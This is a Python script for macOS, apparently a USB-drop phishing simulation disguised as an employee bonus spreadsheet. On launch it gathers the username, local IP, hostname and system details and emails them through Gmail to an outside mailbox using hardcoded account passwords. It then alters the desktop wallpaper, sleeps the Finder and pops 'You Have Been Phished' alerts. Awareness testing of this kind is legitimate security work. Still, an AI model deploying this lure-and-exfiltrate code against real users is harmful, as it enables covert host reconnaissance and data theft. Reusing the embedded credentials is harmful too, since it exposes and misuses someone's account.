# -*- coding: utf-8 -*-
import platform
import getpass
import socket
import smtplib
import time
# import webbrowser
import os
import requests
import subprocess

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

date = time.strftime("%d_%b_%Y | %H:%M:%S")
file = "List Bonus Karyawan PrivyID.xlsx"
# usb = "USB 5"
my_system = platform.uname()
my_system1 = platform.architecture()
my_system2 = platform.mac_ver()
hostname = socket.gethostname()
 
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('8.8.8.8', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP
 
local_ip = get_local_ip()

IPAddr = local_ip
edition = platform.platform()

print(f"System : {my_system.system}")
print(f"System Username : {getpass.getuser()}")
print(f"IP Local : {IPAddr}")
print(f"Node Name : {my_system.node}")
print(f"Release : {my_system.release}")
print(f"Version : {my_system.version}")
print(f"Machine : {my_system.machine}")
print(f"Processor : {my_system.processor}")
print(f"Architecture : {my_system1}")
print(f"MacOS : {my_system2}")
print(f"Platform : {edition}")
# print(f"Flashdisk yang di colok: {usb}")
print(f"File yang di klik : {file}")
print(f"Di klik pada tanggal : {date}")

mail_content1 = (f"System : {my_system.system}\n")
mail_content2 = (f"System Username : {getpass.getuser()}\n")
mail_content3 = (f"IP Local : {IPAddr}\n")
mail_content4 = (f"Node Name : {my_system.node}\n")
mail_content5 = (f"Version : {my_system.version}\n")
mail_content6 = (f"Release : {my_system.release}\n")
mail_content7 = (f"Machine : {my_system.machine}\n")
mail_content8 = (f"Processor : {my_system.processor}\n")
mail_content9 = (f"Architecture : {my_system1}\n")
mail_content10 = (f"MacOS : {my_system2}\n")
mail_content11 = (f"Edition : {edition}\n")
# mail_content12 = (f"Flashdisk yang di colok : {usb}\n")
mail_content13 = (f"File yang di klik : {file}\n")
mail_content14 = (f"Di klik pada tanggal : {date}\n")

# sender_address = 'sender.usb.simulation@gmail.com'
# sender_pass = 'qbnnswihmmudjsou'
sender_address = 'tiara.yolanda9811@gmail.com'
sender_pass = 'oyargflkonpvacro'
# receiver_address = ['d.rama@mssindonesia.co.id', 'forprivyid@mssindonesia.co.id', 'amandapranata58@gmail.com']
receiver_address = ['amandapranata58@gmail.com']

message = MIMEMultipart()
message['From'] = sender_address
message['To'] = ", ".join(receiver_address)
message['Subject'] = "Flashdisk terdeteksi"

message.attach(MIMEText(mail_content1, 'plain'))
message.attach(MIMEText(mail_content2, 'plain'))
message.attach(MIMEText(mail_content3, 'plain'))
message.attach(MIMEText(mail_content4, 'plain'))
message.attach(MIMEText(mail_content5, 'plain'))
message.attach(MIMEText(mail_content6, 'plain'))
message.attach(MIMEText(mail_content7, 'plain'))
message.attach(MIMEText(mail_content8, 'plain'))
message.attach(MIMEText(mail_content9, 'plain'))
message.attach(MIMEText(mail_content10, 'plain'))
message.attach(MIMEText(mail_content11, 'plain'))
# message.attach(MIMEText(mail_content12, 'plain'))
message.attach(MIMEText(mail_content13, 'plain'))
message.attach(MIMEText(mail_content14, 'plain'))

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
smtpserver.ehlo()
smtpserver.login(sender_address, sender_pass)

text = message.as_string()
smtpserver.sendmail(sender_address, receiver_address, text)
smtpserver.quit()

# url = 'https://i.ibb.co/4Pg0cMK/Landing-Page-Privy.jpg(url)'
# webbrowser.open(url)
phish_notif = "osascript -e 'display notification \"You Have Been Phished, Please Update Awareness Knowledge\" with title \"Phishing detected\" sound name \"Ping.aiff\"'"
os.system(phish_notif)

sleep_command = "osascript -e 'tell application \"Finder\" to sleep'"
os.system(sleep_command)

time.sleep(10)

desktop_command = f"echo 'Mohon mengkontak Blue Team dan segera mengembalikan usb yang dicolok kepada Blue Team, Terima kasih' > /Users/{getpass.getuser()}/Desktop/NOTES_PLEASE_READ.txt"
os.system(desktop_command)

try:
    download_picture = requests.get("https://raw.githubusercontent.com/mikeD106/sec-aware/main/image.png")
    with open("/tmp/image.png", "wb") as file:
        file.write(download_picture.content)
    subprocess.check_output(["osascript -e 'tell application \"System Events\" to tell every desktop to set picture to \"/tmp/image.png\"'"], shell=True)
except:
    pass

try:
    subprocess.check_output("osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"You Have Been Phished, Please Update Awareness Knowledge\" & return with icon 0 with title \"Phishing Detected\"'", shell=True)
except:
    pass